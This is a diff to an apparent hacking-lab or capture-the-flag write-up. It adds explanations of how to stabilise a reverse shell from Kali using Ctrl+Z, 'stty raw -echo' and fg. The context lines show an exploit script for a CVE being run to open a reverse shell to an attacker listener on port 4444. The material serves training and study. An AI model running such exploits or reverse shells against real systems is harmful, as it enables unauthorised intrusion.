@@ -1441,7 +1441,11 @@ To achieve a "Gold Standard" interactive shell, follow these steps:
 
 #### Step 1: Background the Shell
 
+When you first connect, your **local** terminal (Kali) is still in "cooked" mode. This means your Kali terminal is "listening" for special keys like `Tab` or `Ctrl+C`.
 
+- **The Problem:** If you hit `Ctrl+C` to stop a command on the target, your Kali terminal sees it first, thinks you want to stop the `nc` (Netcat) listener, and **kills your connection entirely.**
+    
+- **The Fix:** You background the shell so you can talk to your **local** terminal (Kali) for a second without the remote server hearing you.
 
 In your current terminal, press **Ctrl+Z**. This suspends the reverse shell and returns you to your Kali prompt.
 
@@ -1465,7 +1469,7 @@ zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --
 
 **Breakdown:**
 
-- **`stty raw`**: Tells your local terminal to pass all keyboard input (including `Ctrl+C` and `Tab`) directly to the remote shell without processing it locally.
+- **`stty raw`**: `stty` stands for "Set TTY" (terminal settings). Tells your local terminal to pass all keyboard input (including `Ctrl+C` and `Tab`) directly to the remote shell without processing it locally.
 - **`-echo`**: Disables local echoing so you don't see double characters.
 - **`fg`**: Brings the backgrounded reverse shell back to the foreground.
 
